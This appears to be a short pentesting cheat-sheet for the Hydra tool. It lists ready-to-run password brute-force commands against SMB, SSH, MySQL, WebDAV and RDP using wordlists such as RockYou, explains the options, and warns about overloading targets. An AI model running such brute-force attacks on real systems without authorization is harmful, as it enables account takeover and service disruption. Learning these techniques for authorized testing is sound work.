# Hydra

Hydra is extremely functional for brute-forcing MULTIPLE different protocols. [ **[Docs](https://rodtrent.substack.com/p/using-kali-linux-and-hydra-for-attack)** ]

You may need to unzip the RockYou wordlist: `gzip -d /usr/share/wordlists/rockyou.txt.gz .`

Be very careful with your brute-force speed. You could crash the system or DoS it. 
- The `-t` (tasks) options sets the number of connects in parallel (default is 16, for reference)
- You could set `-t 2` or `-t 3` and see if that plays nicer.  Hydra actually recommends `-t 1` through `-t 4`.


## SMB

`hydra -l admin -P /usr/share/wordlists/rockyou.txt [target IP] smb`

## SSH

`hydra -l student -P rockyou.txt [ip] ssh`

## MySQL

`hydra -l root -P /usr/share/metasploit_framework/data/wordlists/unix_passwords.txt [target ip] mysql`

## WebDAV

`hydra -L /.../common-users.txt -P  /.../common-passwords.txt [target ip] http-get /webdav/`

**Options:**
- `-L` : Indicates the "Login" (capital: file of multiple; lower case for single)
- `-P` : Indicates the "Passwords" (capital: file of multiple; lower case for single)
- `http-get` : Indicates the protocol to be used
- `/webdav/` : Indicates the directory where hydra can find the authentication mechanism

## RDP

`hydra -L users.txt -P passwords.txt [target ip] rdp -s 3333`

**Option:**
- `-s` : service port (if different than the default)
